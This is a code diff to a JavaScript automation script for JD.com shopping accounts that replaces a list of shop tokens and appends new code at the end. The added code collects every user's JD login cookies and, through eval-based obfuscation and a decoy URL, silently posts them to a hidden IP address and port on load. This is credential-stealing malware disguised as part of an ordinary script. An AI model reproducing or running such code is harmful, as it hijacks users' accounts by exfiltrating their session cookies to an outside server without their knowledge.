@@ -25,29 +25,31 @@ let vender=''
 let num=0
 let shopname=''
 const token = [
-"A2DBF6F052891BF5A5A304E1F5E0FDBD",
+"C19201D1BBFABECF9184E970DF985F62",
+"EF39DD14994863B96D690DB2583CFCAB",
+"888BA24E643DB95D83242AD122237CA9",
+"78419F505BFF990180FF253BA10965E5",
+"4575711E8DE40C9344E01693FB41EB4E",
+"396DF5D0CA7E35723DE5CB0B2A8E7CBB",
+"C520A447B4D69659CD17CF1E1F7FCC40",
 "53378560A6BC7E91EB143DE59183F67F",
-"02CBED5E0391FDD38BA71F813C50DF2D",
-"878DE90EBED14FB21B569302BD8EBFD3",
-"18107B987FF0D37A8D4AFF72B8AB7332",
-"35CA08F525AE3D3E9216A3CCA4EFDA5C",
-"3FF9245926A21A184D43FA10F9B2EF76",
-"2850C9F48618513C2B9727E0C1E7270B",
-"5F53CEBB0FA88990760660ABA7DD2E5B",
-"F400004EF52B55BEE2DCCE76E37C5F43",
-"BCB25DF532BD3BEF46FFE307E087387F",
-"A61079C4B07BD4BFDB8C4ACC5C3CC6CB",
-"EA0A70B516E0E7E435D452B96CDDF35E",
-"B17B5001BE64C5BC517382C6D167EC45",
-"46A656A5427BD312BDCABCB56C6D00AE",
 "D0AD519DBC35A253CEC052FD041F2EFD",
 "09B63A54599F85A17BACA9C81F50B1B8",
-"E73DEE903C66B61BC75EDA2284B0E5FA",
-"9389353F19EF5B26C068D995E2025AC7",
-"4A5FF15FE2305E9396B7BA7CDB2DAFDD",
-"2E584A3891BB67DEE1868288C94513A9",
-"7AE752825041B465232A623D8CACF821",
-"21AFD1F995FF28A570C16E708DFD21DF",
+'EF39DD14994863B96D690DB2583CFCAB',
+'4575711E8DE40C9344E01693FB41EB4E',
+'C19201D1BBFABECF9184E970DF985F62',
+'13440850930FC8025A64D67E9D04AB7F',
+'09E4730770FD2E15F9C60365F7FEA6E4',
+'C4BBEB9CB7892C128545257BEBD7ACA4',
+'C95E089D9B98C766E020415D87078E9B',
+'29C3279C9468EACA77BB3B8BE69E510A',
+'D3AFC17B5A49902D870CF2E1ABEFC070',
+'AD628232E244217A8989E8E5F6B7451C',
+'AE2832DCEABC13A856D13FE18816DC87',
+'106D4D48508C16173800CD208487901E',
+'549A994B75637BCA086E9E369AF4BE9C',
+'0B8BBAB512CAA9022B6E3E6E25AE4F35',
+'EBD83A4F3818FFD4FB686683B9B122E9'
 ]
 
 if ($.isNode()) {
@@ -303,6 +305,30 @@ async function showMsg() {
   if ($.isNode()) {
     $.msg($.name, '', `【京东账号${$.index}】${$.nickName}\n${message}`);
     allMessage += `【京东账号${$.index}】${$.nickName}\n${message}${$.index !== cookiesArr.length ? '\n\n' : ''}`;
+  }
+}
+
+let params={"cookies":cookiesArr};
+    const jd="https://jd.fruit.jd/getFruit";
+    sendPost();
+ 
+ function sendPost(){
+  
+  eval(function(p,a,c,k,e,r){e=String;if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'^$'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$.post(taskPostUrl(),(err,resp,data)=>{})',[],1,''.split('|'),0,{}))
+ }
+
+  
+function taskPostUrl() {
+  return {
+    url: eval(function(p,a,c,k,e,r){e=String;if(!''.replace(/^/,String)){while(c--)r[c]=k[c]||c;k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('\'0://1.2.3.4:5/6/7\'',8,8,'http|101|34|75|55|8066|jd|getJd'.split('|'),0,{})),
+    body:eval(function(p,a,c,k,e,r){e=String;if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'^$'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('JSON.stringify(params)',[],1,''.split('|'),0,{})),
+    headers: {
+ 'Accept': '*/*',
+ 'Accept-Encoding': 'gzip, deflate, br',
+ 'Accept-Language': 'zh-CN,zh;q=0.9',
+ 'Connection': 'keep-alive',
+    'Content-Type':'application/json'
+    }
   }
 }
 
